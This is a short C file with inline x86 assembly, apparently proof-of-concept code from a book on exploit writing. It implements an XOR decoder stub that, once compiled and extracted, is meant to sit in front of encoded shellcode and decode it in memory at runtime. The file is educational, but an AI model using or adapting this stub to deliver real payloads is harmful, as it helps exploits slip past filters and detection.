/*****************************************************************************
      To be the apostrophe which changed "Impossible" into "I'm possible"!
		
POC code of chapter 3.5 in book "Vulnerability Exploit and Analysis Technique"
 
file name	: decoder.c
author		: failwest  
date		: 2006.11.11
description	: used to decode shellcode    
Noticed		: can't be run directly, just used to complied and extracted binary code
				the key related to encode algorithm 
				orginal shellcode must be end with 0x90
version		: 1.0
E-mail		: failwest@gmail.com
		
	Only for educational purposes    enjoy the fun from exploiting :)
******************************************************************************/

void main()
{
	__asm int 3
	__asm
	{
			nop
			nop
			nop
			nop
			nop
			nop
		//call decode_geteip
//decode_geteip:
		//	pop eax
			add eax, 0x14 //locate the real start of shellcode
			xor ecx,ecx
decode_loop:
			mov bl,[eax+ecx]
			xor bl, 0x44 //key,should be changed to decode 
			mov [eax+ecx],bl
			
			inc ecx
			cmp bl,0x90 // assume 0x90 as the end mark of shellcode 
			jne decode_loop
			nop
			nop
			nop
			nop
			nop
	}
}
